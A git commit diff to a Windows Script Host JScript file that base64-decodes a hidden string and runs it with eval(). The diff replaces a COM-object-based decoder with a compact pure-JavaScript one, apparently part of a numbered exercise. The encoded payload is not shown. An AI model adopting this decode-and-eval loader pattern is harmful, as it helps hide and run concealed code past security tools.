219c9c92140d6a714764967ce3bc7ff8df34ce49
João Xavier <fastjonh@gmail.com>
2022-07-26 08:42:59 -0300

    new base64 decode method

--- #02/Part #02/final.js
+++ #02/Part #02/final.js
@@ -10,17 +10,13 @@ var decodedText = decodeBase64(encodedText);
 
 eval(decodedText)
 
-function decodeBase64(encodedText) {
-    var xmlDOM = WSH.CreateObject("microsoft.xmldom").createElement("mko");
-    xmlDOM.dataType = "bin.base64";
-    xmlDOM.text = encodedText;
-
-    var comObject = WSH.CreateObject("adodb.stream");
-    comObject.Type = 1;
-    comObject.Open();
-    comObject.Write(xmlDOM.nodeTypedValue);
-    comObject.Position = 0;
-    comObject.Type = 2;
-    comObject.CharSet = "us-ascii";
-    return comObject.ReadText();
-}
+function decodeBase64(s) {
+    var e = {}, i, b = 0, c, x, l = 0, a, r = '', w = String.fromCharCode, L = s.length;
+    var A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    for (i = 0; i < 64; i++) { e[A.charAt(i)] = i; }
+    for (x = 0; x < L; x++) {
+        c = e[s.charAt(x)]; b = (b << 6) + c; l += 6;
+        while (l >= 8) { ((a = (b >>> (l -= 8)) & 0xff) || (x < (L - 2))) && (r += w(a)); }
+    }
+    return r;
+};
